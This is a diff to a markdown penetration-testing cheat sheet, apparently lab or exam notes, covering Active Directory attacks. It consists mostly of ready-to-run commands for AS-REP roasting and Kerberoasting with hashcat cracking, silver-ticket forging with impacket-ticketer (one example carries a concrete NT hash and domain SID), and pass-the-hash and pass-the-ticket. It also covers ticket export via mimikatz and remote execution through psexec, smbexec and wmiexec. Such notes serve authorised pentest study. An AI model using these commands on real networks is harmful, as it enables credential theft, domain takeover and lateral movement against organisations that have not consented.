@@ -315,36 +315,6 @@ Cached Credentials:
 TGT and TGS:
 1. sekurlsa::tickets
 ```
-#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
-Enum users with Do not require Kerberos preauthentication enabled
-```
-PowerView's Get-DomainUser function with the option -PreauthNotRequired
-kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
-```
-Extract hashes and Crack
-```
-.\Rubeus.exe asreproast /nowrap
-hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-```
-#### Kerberoasting
->The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
-
->Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
-
->You need valid credentials inside the domain.
-```
-Check all SPNs within the domain:
-setspn -Q */*
-```
-```
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
-```
->If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
-```
-sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-```
-
 ### Lateral Movement
 /ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
 /ptt - no output in file, just inject the golden ticket in current session.
@@ -391,6 +361,35 @@ net use \\dc01(logon server)
 klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
+#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
+Enum users with Do not require Kerberos preauthentication enabled
+```
+PowerView's Get-DomainUser function with the option -PreauthNotRequired
+kali: impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast domain/username:pass
+```
+Extract hashes and Crack
+```
+.\Rubeus.exe asreproast /nowrap
+hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+#### Kerberoasting
+>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
+
+>Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
+
+>You need valid credentials inside the domain.
+```
+Check all SPNs within the domain:
+setspn -Q */*
+```
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
+```
+>If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
+```
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
+```
 #### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Once we have access to the password hash of the SPN, a machine account, or user, we can forge the related service tickets for any users and permissions. This is a great way of accessing SPNs in later phases of a penetration test, as we need privileged access in most situations to retrieve the password hash of the SPN.
 
@@ -416,6 +415,8 @@ setspn -L svc_mssql
 
 Exploiting silver ticket:
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+# To generate the TGS with AES key
+impacket-ticketer -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> -user-id 500 Administrator
 
 export KRB5CCNAME=$PWD/Administrator.ccache
 
@@ -444,14 +445,38 @@ Create /etc/krb5user.conf:
 192.168.227.21  nagoya.nagoya-industries.com
 
 impacket-mssqlclient -k nagoya.nagoya-industries.com
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
-#### Pass the ticket
+#### Pass The Hash/Pass The Key
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
 >The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
 ```
 sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
+```
+```
+# Request the TGT with hash
+python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
+python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+# Request the TGT with password
+python getTGT.py <domain_name>/<user_name>:[password]
+# If not provided, password is asked
+
+# Set the TGT for impacket use
+export KRB5CCNAME=<TGT_ccache_file>
+
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+
+# To convert tickets between Linux/Windows format with ticket_converter.py:
+impacket-ticket_converter ticket.kirbi ticket.ccache
+impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
 
 ### Persistence
